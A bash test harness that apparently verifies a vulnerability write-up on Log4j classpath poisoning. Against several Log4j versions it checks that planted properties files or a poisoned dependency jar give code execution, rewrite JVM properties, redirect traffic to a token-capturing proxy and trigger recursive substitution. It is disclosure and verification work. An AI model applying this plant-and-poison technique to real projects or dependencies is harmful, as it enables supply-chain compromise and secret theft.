#!/usr/bin/env bash
# Verifies every claim in WORKUP.md by running the attack and checking the outcome.
# Exit code 0 = every expectation held.
set -uo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT"

[ -d lab/build ] || ./lab/build.sh >/dev/null

JAVA="${JDK:-/usr/lib/jvm/java-8-openjdk-amd64}/bin/java"
GROOVY="lib/groovy-4.0.24.jar:lib/groovy-jsr223-4.0.24.jar"
PROOF=/tmp/log4j-lab-pwned.txt

fail=0
report() { # status desc expected got
    if [ "$1" = "$2" ]; then
        printf 'PASS  %-58s expected=%-24s got=%s\n' "$3" "$2" "$4"
    else
        printf 'FAIL  %-58s expected=%-24s got=%s\n' "$3" "$2" "$4"
        fail=1
    fi
}

check_plant() { # description expected version classpath-entry victim
    local desc="$1" expect="$2" ver="$3" entry="$4" victim="$5"
    local got
    rm -f "$PROOF"
    "$JAVA" -cp "lib/log4j-api-$ver.jar:lib/log4j-core-$ver.jar:$GROOVY:lab/build/victim:$entry" \
        "$victim" >/dev/null 2>&1
    if [ -f "$PROOF" ]; then got=RCE; else got=blocked; fi
    report "$got" "$expect" "$desc" "$got"
}

check_api() { # description expected version classpath-entry
    local desc="$1" expect="$2" ver="$3" entry="$4"
    local got
    got=$("$JAVA" -cp "lib/log4j-api-$ver.jar:lab/build/victim:$entry" lab.ApiOnly 2>&1 \
        | grep -o 'AFTER  log4j init : .*' | sed 's/.*: //')
    report "$got" "$expect" "$desc" "$got"
}

echo "== 1: RCE through the planted log4j2.system.properties"
for v in 2.14.1 2.17.1 2.24.0 2.25.1 2.26.1; do
    check_plant "$v planted log4j2.system.properties" RCE "$v" lab/poison lab.ClasspathPoison
done

echo "== 2: RCE through the planted log4j2.component.properties"
check_plant "2.26.1 planted log4j2.component.properties" RCE 2.26.1 lab/poison-component lab.ClasspathPoison

echo "== 3: supply chain - the planted resource inside a dependency jar"
check_plant "2.26.1 planted resource inside a dependency jar" RCE 2.26.1 lab/build/evil-dependency.jar lab.ClasspathPoison

echo "== 4: negative controls"
check_plant "2.26.1 no planted file (must be blocked)" blocked 2.26.1 lab/build/victim lab.ClasspathPoison

echo "== 5: log4j-api alone rewrites the JVM's system properties"
for v in 2.14.1 2.26.1; do
    check_api "$v log4j-api only: planted file rewrites JVM properties" planted-by-attacker "$v" lab/poison
done
check_api "2.26.1 log4j-api only, no planted file (must be clean)" null 2.26.1 lab/build/victim

echo "== 6: the plant reaches past Log4j (outbound traffic redirected)"
captured=$(python3 lab/proxy_capture.py "$JAVA" -cp "lib/log4j-api-2.26.1.jar:lib/log4j-core-2.26.1.jar:lab/build/victim:lab/poison-proxy" lab.ProxyVictim 2>&1)
if echo "$captured" | grep -q 'token=s3cr3t'; then
    report captured captured "proxy captured the victim's request" captured
else
    report missed captured "proxy captured the victim's request" missed
fi

echo "== 7: the planted value reaches the recursive (configuration) substitutor"
leak=$("$JAVA" -cp "lib/log4j-api-2.26.1.jar:lib/log4j-core-2.26.1.jar:lab/build/victim:lab/poison-policy" lab.PolicyProbe 2>&1 | grep -o 'LEAK=\[[^]]*\]' | head -1)
if [ -n "$leak" ] && [ "$leak" != 'LEAK=[${env:HOME}]' ]; then
    report expanded expanded "planted property evaluated recursively at config time" "$leak"
else
    report "$leak" expanded "planted property evaluated recursively at config time" "$leak"
fi

echo
if [ "$fail" -eq 0 ]; then
    echo "ALL CHECKS PASSED"
else
    echo "SOME CHECKS FAILED"
fi
exit "$fail"
